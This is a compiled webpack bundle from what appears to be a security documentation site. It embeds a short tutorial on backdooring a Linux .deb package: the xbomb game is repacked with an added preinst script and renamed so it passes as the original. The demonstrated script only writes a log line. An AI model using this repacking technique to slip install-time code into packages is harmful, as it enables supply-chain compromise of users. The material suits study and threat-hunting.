(window.webpackJsonp=window.webpackJsonp||[]).push([[21],{101:function(e,t,n){"use strict";n.d(t,"a",(function(){return p})),n.d(t,"b",(function(){return m}));var r=n(0),a=n.n(r);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function c(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var b=a.a.createContext({}),u=function(e){var t=a.a.useContext(b),n=t;return e&&(n="function"==typeof e?e(t):c(c({},t),e)),n},p=function(e){var t=u(e.components);return a.a.createElement(b.Provider,{value:t},e.children)},s={inlineCode:"code",wrapper:function(e){var t=e.children;return a.a.createElement(a.a.Fragment,{},t)}},d=a.a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,i=e.parentName,b=l(e,["components","mdxType","originalType","parentName"]),p=u(n),d=r,m=p["".concat(i,".").concat(d)]||p[d]||s[d]||o;return n?a.a.createElement(m,c(c({ref:t},b),{},{components:n})):a.a.createElement(m,c({ref:t},b))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=d;var c={};for(var l in t)hasOwnProperty.call(t,l)&&(c[l]=t[l]);c.originalType=e,c.mdxType="string"==typeof e?e:r,i[1]=c;for(var b=2;b<o;b++)i[b]=n[b];return a.a.createElement.apply(null,i)}return a.a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},75:function(e,t,n){"use strict";n.r(t),n.d(t,"frontMatter",(function(){return i})),n.d(t,"metadata",(function(){return c})),n.d(t,"rightToc",(function(){return l})),n.d(t,"default",(function(){return u}));var r=n(2),a=n(6),o=(n(0),n(101)),i={},c={unversionedId:"hunting/linux_deb_backdoor",id:"hunting/linux_deb_backdoor",isDocsHomePage:!1,title:"linux_deb_backdoor",description:"Refs:",source:"@site/docs\\hunting\\linux_deb_backdoor.md",permalink:"/rosh/docs/hunting/linux_deb_backdoor",sidebar:"huntingSidebar",previous:{title:"Forensics",permalink:"/rosh/docs/hunting/forensics"},next:{title:"Linux Privilege Escalation",permalink:"/rosh/docs/hunting/linux_priv_esc"}},l=[],b={rightToc:l};function u(e){var t=e.components,n=Object(a.a)(e,["components"]);return Object(o.b)("wrapper",Object(r.a)({},b,n,{components:t,mdxType:"MDXLayout"}),Object(o.b)("p",null,"Refs:"),Object(o.b)("ul",null,Object(o.b)("li",{parentName:"ul"},Object(o.b)("a",Object(r.a)({parentName:"li"},{href:"https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/"}),"https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/")),Object(o.b)("li",{parentName:"ul"},Object(o.b)("a",Object(r.a)({parentName:"li"},{href:"https://github.com/UndeadSec/Debinject"}),"https://github.com/UndeadSec/Debinject")),Object(o.b)("li",{parentName:"ul"},Object(o.b)("a",Object(r.a)({parentName:"li"},{href:"https://fabianlee.org/2018/09/28/ubuntu-customizing-and-repacking-a-deb-file/"}),"https://fabianlee.org/2018/09/28/ubuntu-customizing-and-repacking-a-deb-file/")),Object(o.b)("li",{parentName:"ul"},Object(o.b)("a",Object(r.a)({parentName:"li"},{href:"http://www.securitytube.net/video/618"}),"http://www.securitytube.net/video/618"))),Object(o.b)("pre",null,Object(o.b)("code",Object(r.a)({parentName:"pre"},{className:"language-bash"}),"# Download the .deb file in which you want to install the backdoor\n$ sudo apt-get --download-only install xbomb\n\n# Make a directory and copy .deb file into the newly created directory\n$ mkdir /tmp/evil\n$ sudo mv /var/cache/apt/archives/xbomb_2.2b-1build1_amd64.deb /tmp/evil\n$ cd /tmp/evil/\n\n# Extract the contents of .deb package into work directory\n$ dpkg -x xbomb_2.2b-1build1_amd64.deb work\n\n# Make DEBIAN directory inside work directory\n$ mkdir /tmp/evil/work/DEBIAN\n\n# Create a control file inside the DEBIAN directory\nstudent@student:/tmpevil/work/DEBIAN$ cat control\n\ncat control\nPackage: xbomb\nVersion: 2.2b-1\nSection: Games and Amusement\nPriority: optional\nArchitecture: i386\nMaintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)\nDescription: a text-based minesweeper\n xbomb is an implementation of the popular minesweeper game, where\n one tries to find all the mines without igniting any, based on hints given\n by the computer. Unlike most implementations of this game, Freesweep\n works in any visual text display - in Linux console, in an xterm, and in\n most text-based terminals currently in use.\n")),Object(o.b)("p",null,"In our DEBIAN directory, we\u2019ll create a file named preinst that contains the following"),Object(o.b)("pre",null,Object(o.b)("code",Object(r.a)({parentName:"pre"},{className:"language-bash"}),'student@student:/tmp/evil/work/DEBIAN# cat preinst\n#!/bin/sh\n\necho "ran preinst of client at $(date)." >> /tmp/my.log\n')),Object(o.b)("p",null,"We\u2019ll now make our pre-installation script executable and build our new package.\nThe built file will be named work.deb so we will want to change that to xbomb.deb"),Object(o.b)("pre",null,Object(o.b)("code",Object(r.a)({parentName:"pre"},{className:"language-bash"}),"student@student:/tmp/evil/work/DEBIAN$ chmod 755 postinst\nstudent@student:/tmp/evil/work/DEBIAN$ dpkg-deb --build /tmp/evil/work\ndpkg-deb: building package `xbomb' in `/tmp/evil/work.deb'.\n\nstudent@student:/tmp/evil$ mv work.deb xbomb.deb\n")),Object(o.b)("p",null,"Now, we can copy xbomb.deb to home folder and double click for installation. In order to confirm that the preinstl script ran check /tmp/my.log file."),Object(o.b)("pre",null,Object(o.b)("code",Object(r.a)({parentName:"pre"},{}),"$ cat /tmp/my.log\nran preinst client at Tue Jul 14 22:06:59 xxx xxxx.\n")),Object(o.b)("p",null,"In order to uninstall the .deb file"),Object(o.b)("pre",null,Object(o.b)("code",Object(r.a)({parentName:"pre"},{className:"language-bash"}),"$ sudo dpkg -P xbomb\n")))}u.isMDXComponent=!0}}]);